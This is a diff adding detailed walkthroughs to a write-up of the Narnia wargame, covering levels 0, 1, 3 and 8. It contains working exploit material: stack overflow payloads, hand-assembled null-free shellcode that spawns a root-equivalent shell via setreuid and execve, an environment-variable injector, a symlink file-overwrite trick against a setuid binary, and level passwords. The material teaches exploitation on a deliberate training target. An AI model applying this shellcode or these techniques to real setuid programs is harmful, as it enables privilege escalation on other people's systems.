@@ -20,6 +20,70 @@ Verification: each password was accepted by logging in as the next level's accou
   id                                   # uid=14001(narnia1)
   cat /etc/narnia_pass/narnia1
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** Narnia ships the C source of every level, so the first command is always to read it:
+   ```
+   sed -n '25,45p' /narnia/narnia0.c
+   ```
+   The declarations and body:
+   ```c
+   long val=0x41414141;
+   char buf[20];
+   ...
+   printf("Here is your chance: ");
+   scanf("%24s",&buf);
+   printf("buf: %s\n",buf);
+   printf("val: 0x%08x\n",val);
+   if(val==0xdeadbeef){ setreuid(geteuid(),geteuid()); system("/bin/sh"); }
+   else { printf("WAY OFF!!!!\n"); exit(1); }
+   ```
+2. **Spot the bug in the size argument.** `buf` is 20 bytes but `scanf("%24s")` accepts 24 — four bytes too many. The level is telling us exactly which four bytes to overflow, and with what value: the target `0xdeadbeef` is named in the prompt itself.
+3. **Confirm the stack layout with objdump.** This is the step that turns the source reading into an offset:
+   ```
+   objdump -d -M intel /narnia/narnia0 | sed -n '/<main>:/,/ret/p'
+   ```
+   ```
+   80491cd: mov DWORD PTR [ebp-0x8],0x41414141    ; val at ebp-0x8
+   80491ee: lea eax,[ebp-0x1c]                    ; buf at ebp-0x1c
+   80491f7: call __isoc23_scanf@plt               ; scanf("%24s", buf)
+   8049220: cmp DWORD PTR [ebp-0x8],0xdeadbeef
+   ```
+   `buf` starts at `ebp-0x1c` and `val` at `ebp-0x8`; the distance is `0x1c - 0x8 = 0x14 = 20` bytes. So `buf[20..23]` *is* `val`. Writing 20 filler bytes and then `0xdeadbeef` overwrites it exactly.
+4. **Check the binary's privileges.** `ls -l /narnia/narnia0` → `-r-sr-x--- 1 narnia1 narnia0`: setuid to narnia1, so a successful overwrite leads to a shell as narnia1. `file` confirms a 32-bit setuid ELF.
+5. **Work out the byte encoding.** `0xdeadbeef` stored in a little-endian `long` means the bytes in memory, and therefore the bytes we must send, are `ef be ad de`. The program's own output proves the layout: it prints `val: 0xdeadbeef` when we are right.
+6. **Build the raw payload.** The input cannot be typed as text — `\xef` etc. are not printable. Two ways are shown:
+   ```
+   python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde")' > /tmp/l0.bin
+   xxd /tmp/l0.bin
+   # 00000000: 4141 4141 4141 4141 4141 4141 4141 4141  ................
+   # 00000010: 4141 4141 efbe adde                      ....
+   ```
+   or, inline, `printf 'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde'`. Twenty `A`s (0x41) followed by the four target bytes.
+7. **Deliver it and keep the shell alive.** The binary is interactive: it reads the line, then calls `system("/bin/sh")` which reads *more* lines from the same stdin. So the payload line and the commands we want the shell to run must be fed together:
+   ```
+   /narnia/narnia0 <<'EOF'
+   AAAAAAAAAAAAAAAAAAAA<4 raw bytes>
+   id
+   cat /etc/narnia_pass/narnia1
+   EOF
+   ```
+   The recording drives it over a PTY instead, because the four raw bytes must not be mangled by a terminal in canonical mode:
+   ```
+   /narnia/narnia0
+   # Here is your chance: AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde
+   # buf: AAAAAAAAAAAAAAAAAAAA....
+   # val: 0xdeadbeef
+   ```
+   The printed `val: 0xdeadbeef` is the confirmation that the overflow landed.
+8. **Use the shell.**
+   ```
+   id                        # uid=14001(narnia1) gid=14000(narnia0)
+   cat /etc/narnia_pass/narnia1
+   # O8dJypubLr
+   ```
+9. **Verify.** `ssh narnia1@... -p 2226` with `O8dJypubLr` → `whoami` prints `narnia1`.
+
+No shellcode is involved at this level: the program already contains the `system("/bin/sh")` we want, and the only job is to flip one integer.
 - **Password for narnia1:** `O8dJypubLr`
 - **Verification:** logged in as `narnia1` with this password.
 - **Recording:** `recordings/narnia/L0.cast`
@@ -35,6 +99,99 @@ Verification: each password was accepted by logging in as the next level's accou
   id                                  # uid=14002(narnia2)
   cat /etc/narnia_pass/narnia2
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.**
+   ```
+   sed -n '18,32p' /narnia/narnia1.c
+   ```
+   ```c
+   int main(){
+       int (*ret)();
+       if(getenv("EGG")==NULL){ printf("Give me something to execute at the env-variable EGG\n"); exit(1); }
+       printf("Trying to execute EGG!\n");
+       ret = (int (*)())getenv("EGG");
+       ret();
+   }
+   ```
+   The program takes the **address of the `EGG` string** and calls it as a function. There is no overflow here at all — the level is about getting machine code into an environment variable.
+2. **Check the privileges.** `ls -l /narnia/narnia1` → `-r-sr-x--- 1 narnia2 narnia1`: setuid to narnia2, so code we run via `EGG` runs with euid narnia2.
+3. **Confirm the stack is executable.** For code in the environment to run, the page holding argv/env must be executable:
+   ```
+   readelf -lW /narnia/narnia1 | grep GNU_STACK
+   # GNU_STACK  ... RWE
+   ```
+   `RWE` is the answer we need: the stack segment is readable, writable and executable.
+4. **Write the shellcode in assembly, in vim, by hand.** The recording opens `vim /tmp/l1.asm` and types the source. It does three things, and each syscall number is written as a *small immediate loaded into `al`* so no instruction contains a NUL byte (a NUL would terminate the environment string):
+   ```
+   BITS 32
+   global _start
+   _start:
+       ; euid = geteuid();  syscall 201
+       xor eax, eax
+       mov al, 201
+       int 0x80
+       ; setreuid(euid, euid);  syscall 70, args ebx=ecx=euid
+       mov ebx, eax
+       mov ecx, eax
+       xor eax, eax
+       mov al, 70
+       int 0x80
+       ; execve("/bin/sh", ["/bin/sh", NULL], NULL);  syscall 11
+       xor eax, eax
+       push eax                 ; NUL terminator for the string
+       push 0x68732f2f          ; "hs//"
+       push 0x6e69622f          ; "nib/"  -> "/bin//sh"
+       mov ebx, esp             ; ebx = pointer to the string
+       push eax                 ; NULL terminator for argv
+       push ebx                 ; argv[0] = the string
+       mov ecx, esp             ; ecx = argv
+       xor edx, edx             ; edx = envp = NULL
+       mov al, 11
+       int 0x80
+   ```
+   **Why `setreuid` is there:** the binary is setuid narnia2, so at `ret()` our *effective* UID is narnia2 while the *real* UID is still narnia1. `execve` of a non-setuid program (`/bin/sh`) sets the new process's credentials from the **real** UID, so without this call the shell would come back as narnia1. Calling `setreuid(geteuid(),geteuid())` moves the real UID to narnia2 first, so the shell inherits narnia2.
+5. **Assemble and inspect it.**
+   ```
+   nasm -f elf32 /tmp/l1.asm -o /tmp/l1.o
+   objdump -d -M intel /tmp/l1.o
+   objcopy -O binary --only-section=.text /tmp/l1.o /tmp/l1.bin
+   xxd -p /tmp/l1.bin
+   wc -c /tmp/l1.bin
+   ```
+   The resulting 41 bytes are
+   ```
+   31c0b0c9cd8089c389c131c0b046cd80 31c05068 2f2f7368 682f62696e 89e3 5053 89e1 31d2 b00bcd80
+   ```
+   which is exactly the byte list the exploit uses, so the payload provably comes from the assembler. Checking `xxd` for `00` bytes is the null-free check.
+6. **Build the environment.** A NOP sled gives us a large landing zone, then the shellcode:
+   ```
+   EGG = b"\x90" * 200 + sc
+   ```
+   The sled is not strictly necessary (the binary calls the *start* of the string), but it makes the payload robust if the entry point ever shifts.
+7. **Pass the environment as bytes.** This is the subtle part. `os.environ` is `str`-keyed and `os.execve` encodes it as UTF-8, which turns each `\x90` into the two bytes `\xc2\x90` — the shellcode is destroyed. The fix is to build a **bytes** dict and exec with it:
+   ```python
+   import os
+   sc = bytes([0x31,0xc0,0xb0,0xc9,0xcd,0x80, 0x89,0xc3,0x89,0xc1,0x31,0xc0,0xb0,0x46,0xcd,0x80,
+               0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,
+               0x53,0x89,0xe1,0x31,0xd2,0xb0,0x0b,0xcd,0x80])
+   env = {b"EGG": b"\x90"*200 + sc, b"PATH": b"/usr/bin:/bin"}
+   os.execve(b"/narnia/narnia1", [b"/narnia/narnia1"], env)
+   ```
+   `PATH` is included because `/bin/sh` may want it; everything else is dropped so the stack layout is minimal.
+8. **Run it.**
+   ```
+   python3 /tmp/e.py
+   # Trying to execute EGG!
+   ```
+   The program prints its message and then control jumps into the sled, slides into the shellcode and `execve`s the shell. The `$` prompt that follows is `/bin/sh` running as narnia2.
+9. **Use the shell.**
+   ```
+   id                        # uid=14002(narnia2) gid=14001(narnia1)
+   cat /etc/narnia_pass/narnia2
+   # 0h8Tj5fxbv
+   ```
+   `uid=14002(narnia2)` is the proof that the `setreuid` in the shellcode did its job — without it this line would read narnia1.
+10. **Verify.** `ssh narnia2@... -p 2226` with `0h8Tj5fxbv` → `whoami` prints `narnia2`.
 - **Password for narnia2:** `0h8Tj5fxbv`
 - **Verification:** logged in as `narnia2` with this password.
 - **Recording:** `recordings/narnia/L1.cast`
@@ -177,6 +334,69 @@ Verification: each password was accepted by logging in as the next level's accou
   /narnia/narnia3 "/tmp/$D/tmp/out3"
   cat /tmp/out3
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.**
+   ```
+   sed -n '20,45p' /narnia/narnia3.c
+   ```
+   ```c
+   char ofile[16] = "/dev/null";
+   char ifile[32];
+   char buf[32];
+   strcpy(ifile, argv[1]);              /* unbounded copy into a 32-byte buffer */
+   if((ofd = open(ofile, O_RDWR)) < 0) { ... }   /* output file, opened first */
+   if((ifd = open(ifile, O_RDONLY)) < 0) { ... } /* input file */
+   read(ifd, buf, 31); write(ofd, buf, 31);
+   ```
+   Two things stand out: `strcpy` into a 32-byte `ifile`, and `ofile` is opened **read-write** with the binary's privileges.
+2. **Find the stack layout in the disassembly.**
+   ```
+   objdump -d -M intel /narnia/narnia3 | sed -n '/<main>:/,/ret/p'
+   ```
+   ```
+   8049215: call strcpy@plt                ; strcpy(ifile, argv[1])
+   804921f: lea eax,[ebp-0x18] ; call open ; open(ofile, O_RDWR)
+   804924e: lea eax,[ebp-0x38] ; call open ; open(ifile, O_RDONLY)
+   8049281: push [ebp-0x8] ; push buf ; push 0x1f ; call read   ; read(ifd, buf, 31)
+   8049295: push [ebp-0x4] ; push buf ; push 0x1f ; call write  ; write(ofd, buf, 31)
+   ```
+   `ifile` is at `ebp-0x38` and `ofile` at `ebp-0x18` — the two are adjacent, and the copy grows **upward** from `ifile` into `ofile`. `ifile` is 32 bytes, so bytes 0..31 fill it and byte 32 onward overwrite `ofile`.
+3. **Check the privileges.** `ls -l /narnia/narnia3` → `-r-sr-x--- 1 narnia4 narnia3`: the binary opens files as narnia4.
+4. **Design the payload.** We control `argv[1]` completely, and the overflow lets one string play two roles:
+   - the first **32 bytes** stay in `ifile` and are used as the *input* path;
+   - bytes **33+** become `ofile`, the *output* path, opened read-write and written to.
+   Choose a string whose first 32 bytes are a directory that exists (`/tmp/` + 27 `A`s = 32 characters exactly), and whose tail is a path inside it. The full path `/tmp/AAAA.../tmp/out3` is 41 characters: 32 for `ifile` and 9 for `ofile`.
+5. **Set up the filesystem to match.**
+   ```
+   D=$(python3 -c 'print("A"*27)')
+   mkdir -p "/tmp/$D/tmp"
+   ln -sf /etc/narnia_pass/narnia4 "/tmp/$D/tmp/out3"
+   rm -f /tmp/out3; touch /tmp/out3; chmod 666 /tmp/out3
+   ```
+   - `ifile` becomes `/tmp/AAAA...` (a real directory, so `open(ifile, O_RDONLY)` succeeds — opening a directory read-only is allowed).
+   - `ofile` becomes `/tmp/out3`. The program opens it `O_RDWR` as narnia4, so it must exist and be writable: we pre-create it world-writable.
+   - The read source inside the directory, `out3`, is a symlink to the narnia4 password file. The privileged `open(ifile)` follows the symlink and reads the password.
+6. **Show the split explicitly before running.** The recording prints the two halves so the reader can see the boundary:
+   ```
+   argv[1] = /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/out3
+     bytes 1-32 (ifile): /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA
+     bytes 33+ (ofile): /tmp/out3
+   ```
+7. **Run it.**
+   ```
+   /narnia/narnia3 "$P"
+   # copied contents of /tmp/AAAA.../tmp/out3 to a safer place... (/tmp/out3)
+   ```
+   That message is printed by the program itself and names the two paths it used — the split is confirmed by the program's own output.
+8. **Read the result.**
+   ```
+   head -c 11 /tmp/out3
+   # CyWyf6uGWQ
+   ```
+   The password was written by the privileged `write(ofd, ...)` into the file we pre-created.
+9. **Verify.** `ssh narnia4@... -p 2226` with `CyWyf6uGWQ` → `whoami` prints `narnia4`.
+
+No shellcode is needed here: the level is a stack overflow used to *redirect a file write*, not to execute code.
 - **Password for narnia4:** `CyWyf6uGWQ`
 - **Verification:** logged in as `narnia4` with this password.
 - **Recording:** `recordings/narnia/L3.cast`
@@ -432,13 +652,61 @@ Verification: each password was accepted by logging in as the next level's accou
    gdb -batch -ex 'b *0x80491d6' -ex 'run AAAA' -ex 'p/x $ebp' -ex 'p/x $ebp-0x18' -ex 'p/x $ebp-0x4' -ex 'p/x *(char**)($ebp-0x4)' -ex 'x/8wx $ebp-0x18' /narnia/narnia8
    ```
    `bok = ebp-0x18`, `blah = ebp-0x4`, and `blah` points at the argv string. The raw output of a 190-byte arg shows `bok[20..23]` holding the corrupted pointer (high bytes `0xffffdf`) — proving the self-corruption.
-5. **Write the shellcode in `vim /tmp/l8.asm`** (same null-free shellcode as the previous levels: marker write, `geteuid`, `setreuid`, `setuid`, `execve("/bin/sh")`), then:
+5. **Write the shellcode in `vim /tmp/l8.asm`.** It is the same null-free code as the earlier levels — marker, `geteuid`, `setreuid`, `setuid`, `execve` — typed in the recorded session:
+   ```
+   BITS 32
+   global _start
+   _start:
+       ; write(1, "PWN!", 4) -- marker so the sweep can tell a hit from a crash
+       xor eax, eax
+       push eax
+       push 0x214e5750
+       mov ecx, esp
+       xor ebx, ebx
+       inc ebx
+       xor edx, edx
+       mov dl, 4
+       xor eax, eax
+       mov al, 4
+       int 0x80
+       ; euid = geteuid(); setreuid(euid, euid)
+       xor eax, eax
+       mov al, 201
+       int 0x80
+       mov ebx, eax
+       mov ecx, eax
+       xor eax, eax
+       mov al, 70
+       int 0x80
+       ; setuid(euid) -- real, effective AND saved, so the privilege survives execve
+       xor eax, eax
+       mov al, 201
+       int 0x80
+       mov ebx, eax
+       xor eax, eax
+       mov al, 23
+       int 0x80
+       ; execve("/bin/sh", ["/bin/sh", NULL], NULL)
+       xor eax, eax
+       push eax
+       push 0x68732f2f
+       push 0x6e69622f
+       mov ebx, esp
+       push eax
+       push ebx
+       mov ecx, esp
+       xor edx, edx
+       mov al, 11
+       int 0x80
+   ```
+   Then assemble and extract the bytes:
    ```
    nasm -f elf32 /tmp/l8.asm -o /tmp/l8.o
-   objdump -d -M intel /tmp/l8.o
+   objdump -d -M intel /tmp/l8.o           # check the encoding of each instruction
    objcopy -O binary --only-section=.text /tmp/l8.o /tmp/l8.bin
-   xxd -p /tmp/l8.bin ; wc -c /tmp/l8.bin
+   xxd -p /tmp/l8.bin ; wc -c /tmp/l8.bin  # no 00 bytes, 78 bytes long
    ```
+   The exploit reads `/tmp/l8.bin`, so the sled it builds carries exactly what nasm produced.
 6. **Find the argv address with the segfault oracle.** Put `0x41414141` at `argv[28..31]` and sweep `argv[20..23]`. If `blah` stays valid the loop copies that value into the return address, the program prints `bok`, and then calls `0x41414141` — a fault *with output*. The sweep candidate that does this is the argv address: **`0xffffdf15`**.
 7. **Build the payload:**
    ```
